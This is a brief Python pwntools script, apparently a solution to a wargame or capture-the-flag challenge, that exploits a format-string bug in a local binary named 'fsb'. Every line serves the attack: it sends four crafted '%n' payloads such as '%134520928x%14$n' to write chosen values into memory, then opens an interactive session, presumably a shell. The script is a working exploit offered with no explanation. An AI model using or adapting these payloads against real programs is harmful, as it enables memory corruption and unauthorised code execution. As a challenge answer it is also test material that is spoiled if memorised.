from pwn import *
from binascii import hexlify

conn = process("fsb")

conn.recvuntil("strings(1)\n")
conn.sendline("%134520928x%14$n")

conn.recvuntil("strings(2)\n")
conn.sendline("%20$n")

conn.recvuntil("strings(3)\n")
conn.sendline("%134520932x%14$n")

conn.recvuntil("strings(4)\n")
conn.sendline("%20$n")

conn.interactive()

